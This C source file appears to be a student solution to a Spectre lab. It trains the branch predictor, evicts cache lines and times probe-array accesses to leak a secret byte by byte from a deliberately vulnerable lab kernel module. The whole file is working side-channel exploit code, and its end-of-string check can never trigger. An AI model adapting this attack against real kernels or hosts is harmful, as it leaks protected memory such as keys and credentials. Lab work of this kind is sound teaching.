/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

#define DRAM_THRESHOLD 100
#define TRAINING_LOOPS 10
#define EVICTION_SIZE (32 * 1024 * 1024)  // 32MB — larger than LLC

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    // Allocate eviction buffer larger than LLC to flush part3_limit from cache
    char *eviction_buf = malloc(EVICTION_SIZE);
    if (!eviction_buf) {
        fprintf(stderr, "Failed to allocate eviction buffer\n");
        return EXIT_FAILURE;
    }
    memset(eviction_buf, 0, EVICTION_SIZE);

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        uint64_t results[256] = {0};

        printf("Leaking offset %zu...\n", current_offset);

        for (int tries = 0; tries < 25; tries++) {
            // Train the branch predictor with offset less than part3_limit to make it predict the branch will be taken
            for (int j = 0; j < TRAINING_LOOPS; j++) {
                call_kernel_part3(kernel_fd, shared_memory, 0);
            }

            // Evict part3_limit from cache by reading a large eviction buffer to extend the speculation window
            // Stride by 64 bytes (cache line size)
            volatile int sink = 0;
            for (int pass = 0; pass < 2; pass++) {
                for (int e = 0; e < EVICTION_SIZE; e += 64) {
                    sink += eviction_buf[e];
                }
            }

            // Flush probe array from cache to ensure we can detect when the kernel brings values into cache
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
            }
            asm volatile("mfence" ::: "memory");

            // Attack — part3_limit is now cold in cache, so the branch
            // condition takes longer to resolve, widening the speculation window
            call_kernel_part3(kernel_fd, shared_memory, current_offset);

            // Probe in ASCII printable range
            for (int i = 32; i < 127; i++) {
                uint64_t t = time_access(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE));
                printf("Offset %zu, try %d, char %c: access time %lu cycles\n", current_offset, tries, i, t);
                if (t < DRAM_THRESHOLD) {
                    results[i]++;
                }
            }
        }

        // Pick the winner
        int best_val = 32;
        for (int i = 33; i < 127; i++) {
            if (results[i] > results[best_val]) best_val = i;
        }
        leaked_str[current_offset] = (char)best_val;

        if ((char)best_val == '\x00') {
            break;
        }
    }

    leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\0';
    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    free(eviction_buf);
    close(kernel_fd);
    return EXIT_SUCCESS;
}